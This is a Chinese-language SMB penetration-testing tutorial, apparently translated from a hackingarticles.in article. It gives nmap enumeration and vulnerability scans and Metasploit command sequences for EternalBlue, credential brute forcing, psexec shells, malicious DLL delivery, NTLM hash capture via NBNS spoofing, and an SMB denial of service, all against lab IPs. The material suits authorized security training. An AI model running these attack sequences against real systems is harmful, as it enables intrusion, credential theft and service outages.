## SMB渗透测试（端口445）

**SMB协议简介** [^1]

- SMB的工作 [^2]

- Windows SMB的版本 

  - | 版本             | 系统                                                         |
    | ---------------- | ------------------------------------------------------------ |
    | CIFS             | 旧版本的SMB，它于1996年包含在Microsoft Windows NT 4.0中      |
    | SMB 1.0 / SMB1   | Windows 2000，Windows XP，Windows Server 2003和Windows Server 2003 R2中使用的版本 |
    | SMB 2.0 / SMB2   | 此版本用于Windows Vista和Windows Server 2008                 |
    | SMB 2.1 / SMB2.1 | 此版本用于Windows 7和Windows Server 2008 R2                  |
    | SMB 3.0 / SMB3   | 此版本用于Windows 8和Windows Server 2012                     |
    | SMB 3.02 / SMB3  | 此版本用于Windows 8.1和Windows Server 2012 R2                |
    | SMB 3.1          | 此版本在Windows Server 2016和Windows 10中使用                |
    |                  | 目前，SMB的最新版本是随Windows 10和Windows Server 2016引入的SMB 3.1.1。此版本除SMB3中添加的AES 128 CCM加密外，还支持AES 128 GCM加密，并使用SMB进行预身份验证完整性检查SHA-512哈希。当使用SMB 2.x及更高版本连接到客户端时，SMB 3.1.1也必须进行安全协商 |

- SMB协议安全性 [^3]

**SMB枚举** [^4]

- Banner Grabbing
- RID cycling
- User listing
- Listing of group membership information
- Share enumeration
- Detecting if a host is in a workgroup or a domain
- Identifying the remote operating system
- Password policy retrieval

`nmap -p 445 -A 192.168.1.101` [^5]

**扫描漏洞 ** [^6]

`nmap --script smb-vuln* -p 445 192.168.1.101` [^7]

**利用SMB的多种方式**

- Eternal Blue(永恒之蓝，MS17-010)

  - ```bash
    use exploit/windows/smb/ms17_010_eternalblue
    msf exploit(ms17_010_eternalblue) > set rhost 192.168.1.101
    msf exploit(ms17_010_eternalblue) > exploit
    ```

- 通过Brute Force登录SMB

  - `hydra -L user.txt -P pass.txt 192.168.1.101 smb` [^8]

  - ```bash
    # 如果您具有SMB登录凭据，则可以使用以下模块通过SAM RPC服务确定存在的本地用户
    use auxiliary/scanner/smb/smb_enumusers
    msf auxiliary(smb_enumusers) > set rhosts 192.168.1.101
    msf auxiliary(smb_enumusers) > set smbuser raj
    msf auxiliary(smb_enumusers) > set smbpass 123
    msf auxiliary(smb_enumusers) > exploit
    ```

- PSexec连接SMB [^9]

  - ```bash
    # 获得目标计算机的SMB登录凭据后，在Metasploit的以下模块的帮助下，您可以获取meterpreter会话以访问远程shell
    use exploit/windows/smb/psexec
    msf exploit windows/smb/psexec) > set rhost 192.168.1.101
    msf exploit(windows/smb/psexec) > set smbuser raj
    msf exploit(windows/smb/psexec) > set smbpass 123
    msf exploit(windows/smb/psexec) > exploit
    ```

- 通过Rundll32 One-liner利用SMB [^10]

  - ```bash
    use exploit/windows/smb/smb_delivery
    msf exploit(windows/smb/smb_delivery) > set srvhost 192.168.1.109
    msf exploit(windows/smb/smb_delivery) > exploit
    # 这将生成恶意DLL文件的链接，现在将此链接发送到您的目标并等待他的操作
    ```

- 通过NTLM Capture利用SMB [^11]

  - ```bash
    # 启动smb服务
    use auxiliary/server/capture/smb
    msf auxiliary(smb) > set srvhost 192.168.1.109
    msf auxiliary(smb) > set johnpwfile /root/Desktop/
    msf auxiliary(smb) > exploit
    ```

  - ```bash
    # 在捕获smb模块下同时运行NBNS_response模块。
    # 此模块伪造NetBIOS名称服务（NBNS）响应。它将侦听发送到本地子网的广播地址的NBNS请求并欺骗响应，将查询计算机重定向到攻击者选择的IP。结合辅助/服务器/捕获/ smb或辅助/服务器/捕获/ http_ntlm，它是在公共网络上收集可破解哈希的高效方法。该模块必须以root身份运行，并在所有接口上绑定到udp / 137
    auxiliary/spoof/nbns/nbns_response
    msf auxiliary(nbns_response) > set spoofip 192.168.1.109
    msf auxiliary(nbns_response) > set interface eth0
    msf auxiliary(nbns_response) >exploit
    # 结果，该模块将在受害者的系统上生成假的窗口安全提示，以建立与另一个系统的连接，以便访问该系统的共享文件夹
    # 现在，当受害者试图访问我们的共享文件夹时，他将尝试通过他的网络IP与我们联系，如下图所示，证明受害者正在连接恶意IP：192.168.1.109。当受害者试图访问共享文件夹时，他将陷入假窗口安全警报提示，这将要求受害者输入他的用户名和密码以访问共享文件夹。
    \\192.168.1.109 #目标主机cmd执行
    john john_smb_netntlmv2
    ```

**SMB DOS攻击** [^12]

```bash
use auxiliary/dos/windows/smb/ms10_006_negotiate_response_loop
msf auxiliary(ms10_006_negotiate_response_loop) > set srvhost 192.168.1.106
msf auxiliary(ms10_006_negotiate_response_loop) > exploit
```

**后利用**

```bash
# 此模块将枚举已配置和最近使用的文件共享
use post/windows/gather/enum_shares
msf post(enum_shares) > set session 1
msf post(enum_shares) > exploit
```

**文件共享** [^13]

```bash
python smbserver.py raj /root/share # 为共享文件夹“raj”执行这个命令
\\192.168.1.108 #目标主机使用cmd连接该地址提供的窗口平台的smb服务
# 这样，我们可以使用smb python脚本在Windows和Linux机器之间共享文件
```

### smbclient [^14]

```bash
smbclient –L 192.168.1.108
smbclient //192.168.1.108/raj
get xxx.txt
help
```

[原文](https://www.hackingarticles.in/smb-penetration-testing-port-445/)

---

[^1]: 服务器消息块（SMB），其现代方言称为通用因特网文件系统，作为文件共享的应用层网络协议运行，允许计算机上的应用程序读取和写入文件并从服务器程序请求服务在计算机网络中。SMB协议可以在其TCP / IP协议或其他网络协议之上使用。**使用SMB协议，应用程序（或应用程序的用户）可以访问远程服务器上的文件或其他资源。这允许应用程序读取，创建和更新远程服务器上的文件。**它还可以与设置为接收SMB客户端请求的任何服务器程序进行通信
[^2]: SMB用作请求 - 响应或客户端 - 服务器协议。协议在响应请求框架中不起作用的唯一时间是客户端请求opportunistic lock（oplock）并且服务器必须中断现有的oplock，因为当前模式与现有的oplock不兼容。使用SMB的客户端计算机使用TCP / IP上的NetBIOS，IPX / SPX或NetBUI连接到支持服务器。一旦建立连接，客户端计算机或程序就可以打开，读/写和访问类似于本地计算机上的文件系统的文件
[^3]: MB协议支持两个级别的安全性。第一个是共享水平。服务器在此级别受到保护，每个共享都有一个密码。客户端计算机或用户必须输入密码才能访问在特定共享下保存的数据或文件。这是Core和Core Plus SMG协议定义中唯一可用的安全模型。用户级保护后来添加到SMB协议中。它适用于单个文件，每个共享基于特定的用户访问权限。一旦服务器对客户端进行身份验证，就会为他/她提供访问服务器时显示的唯一标识（UID）。自LAN Manager 1.0实施以来，SMB协议支持个人安全性。
[^4]: 要识别Windows或Samba系统的以下信息，每个测试者在网络渗透测试期间都要进行SMB枚举
[^5]: [更多SMB枚举小指南](https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/)
[^6]: 在枚举阶段，通常我们会使用标题抓取来识别正在运行的服务版本和主机操作系统。一旦列举了这些信息，您就应该进行漏洞扫描阶段，以确定安装服务是易受攻击的版本还是修补版本
[^7]: 结果，它表明由于SMBv1，目标机器极易受到Ms17-010（永恒蓝色）的影响。要了解有关Ms17-010的更多信息，请阅读完整文章  [扫描远程PC中永久蓝色漏洞的3种方法](https://www.hackingarticles.in/3-ways-scan-eternal-blue-vulnerability-remote-pc/)
[^8]: *-L* **->表示用户名列表的路径**  *-P*  **- >表示密码的路径**。了解更多信息，请阅读此处的完整文章“ **[破解SMB登录密码的5种方法](https://www.hackingarticles.in/5-ways-to-hack-smb-login-password/)** ”
[^9]: 以多种方式连接SMB。阅读完整文章“ [使用SMB端口连接远程PC的多种方法](https://www.hackingarticles.in/multiple-ways-to-connect-remote-pc-using-smb-port/) ”
[^10]: 该模块通过SMB服务器提供有效负载，并提供检索和执行生成的有效负载的命令。目前支持DLL和Powershell
[^11]: 利用SMB的另一种方法是通过捕获SMB目标机器的响应密码哈希来进行NTLM哈希捕获。此模块提供SMB服务，可用于捕获SMB客户端系统的质询 - 响应密码哈希值。默认情况下，此服务发送的响应具有可配置的挑战字符串（\ x11 \ x22 \ x33 \ x44 \ x55 \ x66 \ x77 \ x88），允许使用Cain＆Abel，L0phtcrack或John the Ripper（使用jumbo补丁）轻松破解。要利用此功能，目标系统必须尝试对此模块进行身份验证。要了解更多信息，请阅读此处的完整文章“ **[在网络中捕获NTLM哈希的4种方法](https://www.hackingarticles.in/4-ways-capture-ntlm-hashes-network/)** ”
[^12]: SMB Dos攻击是我们在Metasploit框架中拥有的另一种最优秀的方法。此模块利用Windows 7和Windows Server 2008 R2上的Microsoft Windows SMB客户端中的拒绝服务缺陷。要触发此错误，请将此模块作为服务运行，并强制易受攻击的客户端作为SMB服务器访问此系统的IP。如果目标正在使用Internet Explorer或Word文档，则可以通过将UNC路径（\ HOST \ share \ something）嵌入到网页中来实现
[^13]: 现在我们将使用一个python脚本来激活Linux机器中的SMB服务。这在目标机器没有可写可用份额的情况下很有用。您可以访问[GitHub](https://github.com/CoreSecurity/impacket/blob/master/examples/smbserver.py)  获取此python脚本
[^14]: smbclient是一个可以与SMB / CIFS服务器“对话”的客户端。它提供类似于FTP程序的界面。操作包括将文件从服务器提取到本地计算机，将文件从本地计算机放到服务器，从服务器检索目录信息等操作